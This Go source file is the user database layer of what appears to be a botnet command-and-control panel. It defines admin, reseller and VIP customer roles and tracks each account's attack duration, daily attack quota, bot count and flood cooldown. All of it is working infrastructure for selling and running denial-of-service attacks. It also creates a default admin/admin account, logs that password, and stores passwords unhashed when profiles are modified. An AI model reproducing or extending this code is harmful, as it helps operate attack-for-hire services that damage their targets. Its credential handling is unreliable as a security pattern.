package database

import (
	"cnc/pkg/logging"
	"database/sql"
	"errors"
	"github.com/lib/pq"
	"reflect"
	"time"
)

const (
	// ROLE_ADMIN has access to all commands and other things.
	ROLE_ADMIN = "admin"
	// ROLE_RESELLER is for botnet resellers that are not supposed to have access to some commands.
	ROLE_RESELLER = "reseller"
	// ROLE_VIP will have more attack methods such as TLS (for future stuff)
	ROLE_VIP = "vip"
)

var (
	defaultUser = &UserProfile{
		Name:         "admin",
		Password:     "admin",
		Cooldown:     0,
		Duration:     300,
		DailyAttacks: 100,
		ApiCooldown:  0,
		ApiDuration:  600,
		Clients:      -1,
		Expiry:       time.Now().AddDate(69, 0, 0),
		Roles:        []string{ROLE_ADMIN},
		CreatedBy:    "PostgreSQL",
	}
)

type UserProfile struct {
	ID int

	// Name is the name of the user
	Name string

	// Password is the hashed password of the user
	Password string

	// PublicKey is the public key of the user.
	PublicKey string

	// Cooldown is the cooldown a user should have, 0 for none.
	Cooldown int

	// ApiCooldown
	ApiCooldown int

	// Duration is the max attack time a user should have.
	Duration int

	// ApiDuration is the max attack time a user should have.
	ApiDuration int

	// DailyAttacks are the daily attacks the user has access to, -1 for infinite.
	DailyAttacks int

	// Clients is the max amount of bots / clients the user has access to
	Clients int

	// Theme is the theme of the user. wow.
	Theme string

	// Expiry is the expiry of the account
	Expiry time.Time

	// Roles are the roles of the account
	Roles []string

	// CreatedBy is the parent account of the current account
	CreatedBy string
}

// Create creates the table
func (u *UserTable) Create() error {
	createTableSQL := `CREATE TABLE IF NOT EXISTS users (
		id SERIAL PRIMARY KEY,
		username TEXT NOT NULL,
		password TEXT NOT NULL,
		public_key TEXT NOT NULL,
		cooldown INT NOT NULL,
		api_cooldown INT NOT NULL,
		duration INT NOT NULL,
		api_duration INT NOT NULL,
		daily_attacks INT NOT NULL,
		max_clients INT NOT NULL,
		theme TEXT NOT NULL,
		expiry TIMESTAMPTZ NOT NULL,
		roles TEXT[] NOT NULL,
		parent TEXT NOT NULL
	);`

	_, err := Sql.Exec(createTableSQL)
	if err != nil {
		return err
	}

	// Checks if a default user exists and inserts one if it doesn't.
	if !u.Exists(defaultUser.Name) {
		if err := u.Insert(defaultUser); err != nil {
			return err
		}

		logging.Global.Warn().
			Str("username", defaultUser.Name).
			Str("password", defaultUser.Password).
			Msg("Inserted default user into database. \x1b[31mMake sure to change the password!")
	}

	return nil
}

// Insert will insert a user into the database.
func (u *UserTable) Insert(profile *UserProfile) error {
	// This is definitely improvable.
	_, err := Sql.Exec(`INSERT INTO users (
                   username, 
                   password, 
                   public_key,
                   cooldown,
                   api_cooldown,
                   duration,
                   api_duration, 
                   daily_attacks, 
                   max_clients, 
                   theme,
                   expiry, 
                   roles, 
                   parent) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13);`,

		profile.Name,
		Hash([]byte(profile.Password)),
		profile.PublicKey,
		profile.Cooldown,
		profile.ApiCooldown,
		profile.Duration,
		profile.ApiDuration,
		profile.DailyAttacks,
		profile.Clients,
		"default",
		profile.Expiry,
		pq.Array(profile.Roles),
		profile.CreatedBy,
	)

	return err
}

// Exists checks if a user exists by their username.
func (u *UserTable) Exists(username string) bool {
	var exists bool

	err := Sql.QueryRow("SELECT exists(SELECT 1 FROM users WHERE username=$1)", username).Scan(&exists)
	if err != nil {
		logging.Global.Error().Err(err).Msg("An unexpected error occurred.")
		return false
	}

	return exists
}

// SelectByUsername will get a user by their username.
func (u *UserTable) SelectByUsername(username string) (*UserProfile, error) {
	// select user from database
	rows, err := Sql.Query("SELECT * FROM users WHERE username=$1", username)
	if err != nil {
		return nil, err
	}

	// close rows after everything is done
	defer closeRows(rows)

	// if there's no row the user doesn't exist, so we return an error
	if !rows.Next() {
		return nil, errors.New("user doesn't exist")
	}

	// now finally scan user profile
	return u.scan(rows)
}

// SelectByID will get a user by their id.
func (u *UserTable) SelectByID(id int) (*UserProfile, error) {
	// select user from database
	rows, err := Sql.Query("SELECT * FROM users WHERE id=$1", id)
	if err != nil {
		return nil, err
	}

	// close rows after everything is done
	defer closeRows(rows)

	// if there's no row the user doesn't exist, so we return an error
	if !rows.Next() {
		return nil, errors.New("user doesn't exist")
	}

	// now finally scan user profile
	return u.scan(rows)
}

// SelectAll will get all users from the database.
func (u *UserTable) SelectAll() ([]*UserProfile, error) {
	var users []*UserProfile

	// select all users with all information
	rows, err := Sql.Query("SELECT * FROM users")
	if err != nil {
		return nil, err
	}

	defer closeRows(rows)

	// iterate through all rows and add users into a slice
	for rows.Next() {
		user, err := u.scan(rows)
		if err != nil {
			return nil, err
		}

		users = append(users, user)
	}

	return users, nil
}

// scan will scan a user profile
func (u *UserTable) scan(rows *sql.Rows) (profile *UserProfile, err error) {
	profile = new(UserProfile)
	return profile, rows.Scan(
		&profile.ID,
		&profile.Name,
		&profile.Password,
		&profile.PublicKey,
		&profile.Cooldown,
		&profile.ApiCooldown,
		&profile.Duration,
		&profile.ApiDuration,
		&profile.DailyAttacks,
		&profile.Clients,
		&profile.Theme,
		&profile.Expiry,
		pq.Array(&profile.Roles),
		&profile.CreatedBy,
	)
}

// Drop will remove the user from the database.
func (u *UserProfile) Drop() error {
	_, err := Sql.Exec("DELETE FROM users WHERE id=$1", u.ID)
	return err
}

// Modify will modify the user.
func (u *UserProfile) Modify() error {
	query := `UPDATE users 
			  SET username=$1, 
                  password=$2, 
                  public_key=$3,
                  api_cooldown=$4,
                  cooldown=$5, 
                  duration=$6,
                  api_duration=$7,
                  daily_attacks=$8, 
                  max_clients=$9, 
                  theme=$10,
                  expiry=$11, 
                  roles=$12, 
                  parent=$13
             WHERE id=$14;`

	_, err := Sql.Exec(query,
		u.Name,
		u.Password,
		u.PublicKey,
		u.Cooldown,
		u.ApiCooldown,
		u.Duration,
		u.ApiDuration,
		u.DailyAttacks,
		u.Clients,
		u.Theme,
		u.Expiry,
		pq.Array(u.Roles),
		u.CreatedBy,
		u.ID,
	)

	return err
}

// HasRole checks if the user has a role.
func (u *UserProfile) HasRole(name string) bool {
	if len(name) < 1 {
		return true
	}

	for _, role := range u.Roles {
		if role == name {
			return true
		}
	}

	return false
}

// ContainsRole checks if the user has a role.
func (u *UserProfile) ContainsRole(name []string) bool {
	if len(name) < 1 {
		return true
	}

	for _, role := range u.Roles {
		for _, s := range name {
			if role == s {
				return true
			}
		}
	}

	return false
}

// IsExpired will check if the user has no time left
func (u *UserProfile) IsExpired() bool {
	return time.Now().After(u.Expiry)
}

// LeftAttacks gets the attacks left
func (u *UserProfile) LeftAttacks() (count int) {
	// select the count of running attacks
	row := Sql.QueryRow("SELECT COUNT(*) FROM logs WHERE user_id=$1", u.ID)

	// scan in the count
	err := row.Scan(&count)
	if err != nil {
		return 0
	}

	return u.DailyAttacks - count
}

func (u *UserProfile) CooldownStatus(api bool) (time.Time, bool, error) {
	if api {
		return u.ApiCooldownStatus()
	}

	return u.RawCooldownStatus()
}

// ApiCooldownStatus will check if the user is on cooldown
func (u *UserProfile) ApiCooldownStatus() (time.Time, bool, error) {
	if u.ApiCooldown == 0 {
		return time.Now(), false, nil
	}

	flood, err := Logs.LastByUserID_2(u.ID, true)
	if flood == nil || err != nil {
		return time.Now(), false, err
	}

	endTime := flood.Ended.Add(time.Duration(u.ApiCooldown) * time.Second)
	return endTime, time.Now().Before(endTime), nil
}

// RawCooldownStatus will check if the user is on cooldown
func (u *UserProfile) RawCooldownStatus() (time.Time, bool, error) {
	if u.Cooldown == 0 {
		return time.Now(), false, nil
	}

	flood, err := Logs.LastByUserID_2(u.ID, false)
	if flood == nil || err != nil {
		return time.Now(), false, err
	}

	endTime := flood.Ended.Add(time.Duration(u.Cooldown) * time.Second)
	return endTime, time.Now().Before(endTime), nil
}

// Update the user profile
func (u *UserProfile) Update() error {
	user, err := User.SelectByID(u.ID)
	if err != nil {
		return err
	}

	// golang is bad but we are worse.
	// no seriously, why can't you just set the struct???

	srcVal := reflect.ValueOf(user).Elem()
	dstVal := reflect.ValueOf(u).Elem()

	for i := 0; i < srcVal.NumField(); i++ {
		dstVal.Field(i).Set(srcVal.Field(i))
	}

	return nil
}
